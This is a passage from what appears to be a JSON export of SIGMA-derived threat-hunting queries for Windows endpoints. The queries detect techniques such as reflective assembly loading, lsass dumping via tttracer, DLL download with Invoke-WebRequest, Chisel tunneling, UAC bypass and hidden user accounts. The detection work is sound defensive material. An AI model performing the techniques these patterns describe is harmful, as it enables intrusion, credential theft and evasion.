            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 718
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious process spawning a Chromium based browser process with the 'load-extension' flag to start an instance with a custom extension",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1176"
            ],
            "name": "Suspicious Chromium Browser Instance Executed With Custom Extension",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\cmd.exe\" or src.process.image.path contains \"\\cscript.exe\" or src.process.image.path contains \"\\mshta.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\" or src.process.image.path contains \"\\regsvr32.exe\" or src.process.image.path contains \"\\rundll32.exe\" or src.process.image.path contains \"\\wscript.exe\") and (tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and tgt.process.cmdline contains \"--load-extension=\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 719
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021"
            ],
            "name": "Suspicious UltraVNC Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"-autoreconnect \" and tgt.process.cmdline contains \"-connect \" and tgt.process.cmdline contains \"-id:\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 720
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "QuickAssist Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\QuickAssist.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 721
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects powershell scripts that import modules from suspicious directories",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Import PowerShell Modules From Suspicious Directories - ProcCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Import-Module \\\"$Env:Temp\\\" or tgt.process.cmdline contains \"Import-Module '$Env:Temp\\\" or tgt.process.cmdline contains \"Import-Module $Env:Temp\\\" or tgt.process.cmdline contains \"Import-Module \\\"$Env:Appdata\\\" or tgt.process.cmdline contains \"Import-Module '$Env:Appdata\\\" or tgt.process.cmdline contains \"Import-Module $Env:Appdata\\\" or tgt.process.cmdline contains \"Import-Module C:\\Users\\Public\\\" or tgt.process.cmdline contains \"ipmo \\\"$Env:Temp\\\" or tgt.process.cmdline contains \"ipmo '$Env:Temp\\\" or tgt.process.cmdline contains \"ipmo $Env:Temp\\\" or tgt.process.cmdline contains \"ipmo \\\"$Env:Appdata\\\" or tgt.process.cmdline contains \"ipmo '$Env:Appdata\\\" or tgt.process.cmdline contains \"ipmo $Env:Appdata\\\" or tgt.process.cmdline contains \"ipmo C:\\Users\\Public\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 722
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Hiding User Account Via SpecialAccounts Registry Key - CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" and tgt.process.cmdline contains \"add\" and tgt.process.cmdline contains \"/v\" and tgt.process.cmdline contains \"/d 0\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 723
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of \"regsvr32.exe\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potentially Suspicious Child Process Of Regsvr32",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\regsvr32.exe\" and (tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\explorer.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\werfault.exe\" or tgt.process.image.path contains \"\\wscript.exe\")) and (not (tgt.process.image.path contains \"\\werfault.exe\" and tgt.process.cmdline contains \" -u -p \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 724
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects base64 encoded .NET reflective loading of Assembly",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1027",
                "t1620"
            ],
            "name": "PowerShell Base64 Encoded Reflective Assembly Load",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\" or tgt.process.cmdline contains \"sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\" or tgt.process.cmdline contains \"bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\" or tgt.process.cmdline contains \"AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC\" or tgt.process.cmdline contains \"BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp\" or tgt.process.cmdline contains \"AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK\" or tgt.process.cmdline contains \"WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ\" or tgt.process.cmdline contains \"sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA\" or tgt.process.cmdline contains \"bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA\" or tgt.process.cmdline contains \"WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\" or tgt.process.cmdline contains \"sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\" or tgt.process.cmdline contains \"bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\")) | columns tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 725
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1003"
            ],
            "name": "Time Travel Debugging Utility Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\tttracer.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 726
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential DLL files being downloaded using the PowerShell Invoke-WebRequest cmdlet",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1105"
            ],
            "name": "Potential DLL File Download Via PowerShell Invoke-WebRequest",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Invoke-WebRequest \" or tgt.process.cmdline contains \"IWR \") and (tgt.process.cmdline contains \"http\" and tgt.process.cmdline contains \"OutFile\" and tgt.process.cmdline contains \".dll\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 727
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Download and compress a remote file and store it in a cab file on local machine.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Suspicious Diantz Download and Compress Into a CAB File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"diantz.exe\" and tgt.process.cmdline contains \" \\\\\" and tgt.process.cmdline contains \".cab\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 728
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line containing reference to the \"::$index_allocation\" stream, which can be used as a technique to prevent access to folders or files from tooling such as \"explorer.exe\" or \"powershell.exe\"\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Potential Hidden Directory Creation Via NTFS INDEX_ALLOCATION Stream - CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"::$index_allocation\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 729
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "InfDefaultInstall.exe .inf Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"InfDefaultInstall.exe \" and tgt.process.cmdline contains \".inf\")) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 730
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Potential UAC Bypass Via Sdclt.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"sdclt.exe\" and (tgt.process.integrityLevel in (\"High\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 731
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the Chisel tunneling tool via the commandline arguments",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "PUA - Chisel Tunneling Tool Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\chisel.exe\" or ((tgt.process.cmdline contains \"exe client \" or tgt.process.cmdline contains \"exe server \") and (tgt.process.cmdline contains \"-socks5\" or tgt.process.cmdline contains \"-reverse\" or tgt.process.cmdline contains \" r:\" or tgt.process.cmdline contains \":127.0.0.1:\" or tgt.process.cmdline contains \"-tls-skip-verify \" or tgt.process.cmdline contains \":socks\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 732
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects encoded base64 MZ header in the commandline",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Base64 MZ Header In CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"TVqQAAMAAAAEAAAA\" or tgt.process.cmdline contains \"TVpQAAIAAAAEAA8A\" or tgt.process.cmdline contains \"TVqAAAEAAAAEABAA\" or tgt.process.cmdline contains \"TVoAAAAAAAAAAAAA\" or tgt.process.cmdline contains \"TVpTAQEAAAAEAAAA\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 733
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential DLL injection and execution using \"Tracker.exe\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Potential DLL Injection Or Execution Using Tracker.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\tracker.exe\" or tgt.process.displayName=\"Tracker\") and (tgt.process.cmdline contains \" /d \" or tgt.process.cmdline contains \" /c \")) and (not (tgt.process.cmdline contains \" /ERRORREPORT:PROMPT \" or (src.process.image.path contains \"\\Msbuild\\Current\\Bin\\MSBuild.exe\" or src.process.image.path contains \"\\Msbuild\\Current\\Bin\\amd64\\MSBuild.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 734
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
